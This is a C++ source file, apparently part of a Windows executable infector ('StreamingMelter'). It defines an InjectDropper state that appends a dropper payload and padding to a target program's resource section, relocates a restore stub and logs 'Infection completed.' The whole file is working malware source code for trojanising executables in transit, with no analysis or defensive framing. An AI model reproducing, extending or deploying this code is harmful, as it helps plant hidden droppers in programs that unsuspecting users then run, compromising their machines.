/*
 * InjectDropper.cpp
 *
 *  Created on: May 7, 2010
 *      Author: daniele
 */

#include "Parsing.h"

void InjectDropper::init()
{
	// RCSDropper& dropper = context<StreamingMelter>().dropper();
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
	neededBytes() = section->SizeOfRawData;
	triggeringOffset() = context<StreamingMelter>().currentOffset();
}

StateResult InjectDropper::parse()
{
	return PARSED;
}

StateResult InjectDropper::process()
{
	ImageSectionHeader& section = context<StreamingMelter>().resourceSection();
	context<StreamingMelter>().complete( section->SizeOfRawData );
	DEBUG_MSG(D_VERBOSE, "Sending resource data: %d", (DWORD) section->SizeOfRawData);

	// relocate restore stub with currentOffset
	Dropper& dropper = context<StreamingMelter>().dropper();
	dropper.restoreStub( context<StreamingMelter>().currentVA() );

	std::size_t dropperSize = dropper.size();
	context<StreamingMelter>().complete(dropper.data(), dropperSize);
	DEBUG_MSG(D_INFO, "Injecting dropper size: %d", (DWORD) dropperSize);

	DWORD sentSectionSize = section->SizeOfRawData + dropperSize;
	DWORD fileAlignment = context<StreamingMelter>().fileAlignment();
	DWORD predictedSectionSize = alignTo(section->SizeOfRawData + dropperSize, fileAlignment);
	DEBUG_MSG(D_INFO, "Predicted resource size: %d", predictedSectionSize);
	DWORD missingBytesToPredictedSize = predictedSectionSize - sentSectionSize;
	DEBUG_MSG(D_INFO, "Missing bytes to predicted size: %d", missingBytesToPredictedSize);

	std::vector<char> padding(missingBytesToPredictedSize, 0);
	context<StreamingMelter>().complete( &padding[0], missingBytesToPredictedSize);
	DEBUG_MSG(D_INFO, "Injecting padding size: %d", (DWORD) missingBytesToPredictedSize);
	DEBUG_MSG(D_INFO, "Infection completed.");

	offsetToNext() = currentOffset() + neededBytes();

	return PROCESSED;
}

sc::result InjectDropper::transitToNext()
{
	return transit< Defective >();
}

InjectDropper::InjectDropper()
	: DataState< InjectDropper, Parsing >()
{
	// TODO Auto-generated constructor stub

}

InjectDropper::~InjectDropper()
{
	// TODO Auto-generated destructor stub
}
